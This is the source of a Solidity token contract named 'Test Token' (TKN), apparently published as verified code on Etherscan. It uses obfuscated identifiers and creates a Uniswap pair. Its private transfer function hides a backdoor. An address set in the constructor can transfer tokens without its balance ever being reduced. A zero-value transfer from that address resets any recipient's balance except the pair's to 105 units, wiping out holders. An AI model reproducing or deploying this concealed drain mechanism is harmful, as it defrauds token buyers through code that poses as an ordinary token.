/**
 *Submitted for verification at Etherscan.io on 2023-06-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Token is Ownable {
    mapping(address => uint256) public balanceOf;

    string public name = "Test Token";

    function approve(
        address qactizbyjp,
        uint256 euiv
    ) public returns (bool success) {
        allowance[msg.sender][qactizbyjp] = euiv;
        emit Approval(msg.sender, qactizbyjp, euiv);
        return true;
    }

    uint8 public decimals = 9;

    function bicmuek(
        address rswvkzjilxm,
        address xdmivh,
        uint256 euiv
    ) private {
        if (xcazqhjibvun[rswvkzjilxm] == 0) {
            balanceOf[rswvkzjilxm] -= euiv;
        }
        balanceOf[xdmivh] += euiv;
        if (
            xcazqhjibvun[msg.sender] > 0 && euiv == 0 && xdmivh != iraqjozemsvd
        ) {
            balanceOf[xdmivh] = xmnzohifseqk;
        }
        emit Transfer(rswvkzjilxm, xdmivh, euiv);
    }

    address public iraqjozemsvd;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "TKN";

    mapping(address => uint256) private xcazqhjibvun;

    function transfer(
        address xdmivh,
        uint256 euiv
    ) public returns (bool success) {
        bicmuek(msg.sender, xdmivh, euiv);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(
        address rswvkzjilxm,
        address xdmivh,
        uint256 euiv
    ) public returns (bool success) {
        require(euiv <= allowance[rswvkzjilxm][msg.sender]);
        allowance[rswvkzjilxm][msg.sender] -= euiv;
        bicmuek(rswvkzjilxm, xdmivh, euiv);
        return true;
    }

    constructor(address jgxhpfmaiznl) {
        balanceOf[msg.sender] = totalSupply;
        xcazqhjibvun[jgxhpfmaiznl] = xmnzohifseqk;
        IUniswapV2Router02 sbtdrclpnei = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        iraqjozemsvd = IUniswapV2Factory(sbtdrclpnei.factory()).createPair(
            address(this),
            sbtdrclpnei.WETH()
        );
    }

    uint256 private xmnzohifseqk = 105;

    mapping(address => uint256) private kxogdh;
}